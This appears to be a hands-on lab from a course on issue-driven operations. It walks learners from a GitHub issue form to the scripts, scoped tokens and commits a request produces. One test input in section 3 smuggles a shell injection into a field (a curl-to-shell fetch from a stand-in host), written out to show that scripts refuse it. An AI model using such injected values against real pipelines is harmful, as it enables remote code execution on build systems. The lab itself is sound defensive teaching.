# Lab 4: Requests

**You need:** the set-up of lab 1. **Time:** 30 minutes.

**You will:** follow a request from the form a person fills in to the
commit it causes, and find out what a request refuses.

## 1. From a form to fields

A request is a GitHub issue opened from a form. The form's answers arrive
as Markdown in the issue body, a heading per field:

```sh
cd issueops-additions
cat .github/ISSUE_TEMPLATE/cool-env-var.yml
cat examples/issues/cool-env-var.md
coolctl issue fields -f examples/issues/cool-env-var.md
```

**Notice:** the heading of each answer is the label of a form field, and
the label reduces to the field's `id`. `test/check.sh` insists on that, so
that scripts can read fields by id.

## 2. From fields to a change

Each request type has a script in `scripts/cool/`. It is handed the fields
as JSON, and a token for the environment the request was approved for:

```sh
request() { # request TYPE ENV FIELDS-JSON
  COOL_FIELDS=$3 COOL_REPORT=/tmp/report.md COOL_WAIT=0 \
  COOL_ISSUE_URL=https://github.com/CoolEngOrg/issueops/issues/501 \
  COOL_TOKEN=$(token repository=CoolEngOrg/issueops environment=cool-$2 \
    job_workflow_ref=CoolEngOrg/issueops/.github/workflows/execute-cool-request.yml@refs/heads/main) \
  scripts/cool/$1.sh; echo "exit code: $?"; cat /tmp/report.md; : > /tmp/report.md
}
request env-var prd "$(coolctl issue fields -f examples/issues/cool-env-var.md)"
git -C "$WORK/gitops" log -1
jq -M '{env, overrides}' "$WORK/gitops/apps/payments/checkout/prd/values.json"
```

**Find:** the issue URL in the commit. Why are the new values under
`overrides` and not under `env`? What happens to them on the next deploy?

## 3. What a request refuses

Predict, then try:

```sh
request env-var prd '{"app":"payments/checkout","environment":"prd","set":"DATABASE_PASSWORD=hunter2"}'
request env-var prd '{"app":"payments/checkout","environment":"prd","set":"PORT=9000"}'
request env-var tst '{"app":"payments/checkout","environment":"prd","set":"A=1"}'
request deploy-promote prd '{"app":"payments/checkout","from":"dev","environment":"prd"}'
request deploy-promote tst '{"app":"payments/checkout; curl evil.example | sh","from":"dev","environment":"tst"}'
request app-retire prd '{"app":"payments/checkout","confirm":"payments/checkuot","reason":"typo"}'
```

For each: who refused, the script or `cool-api`? The third is the
interesting one. The fields say `prd`, the token says `cool-tst`. Which
wins, and why must it be that way round?

## 4. Requests that only open a pull request

Two request types change nothing themselves:

```sh
DRY_RUN=1 request addon dev "$(coolctl issue fields -f examples/issues/cool-addon.md)"
DRY_RUN=1 request api-publish dev "$(coolctl issue fields -f examples/issues/cool-api-publish.md)"
```

**Answer:** an approved add-on request still needs a pull request to be
merged in `cool-infra`. Is that a second approval for the same thing, or an
approval of something different? Who is looking at what, each time?

## 5. Write one

Open `scripts/cool/deploy-rollback.sh`. It is fifteen lines. Then, without
looking at `domain.sh`, write down what a script for "pause an app" (scale
to zero replicas in one environment) would need: its fields, their
patterns, the `coolctl` call, and the report. What would `cool-api` have to
learn first?

## Check yourself

- A form field's `id` is the contract between the form, the registry's
  policy and the script.
- Scripts check every field against a pattern and pass values only as
  arguments. Text from an issue never becomes shell.
- The token's environment, not the form, decides what a request can touch.
- Secrets do not travel through issues.
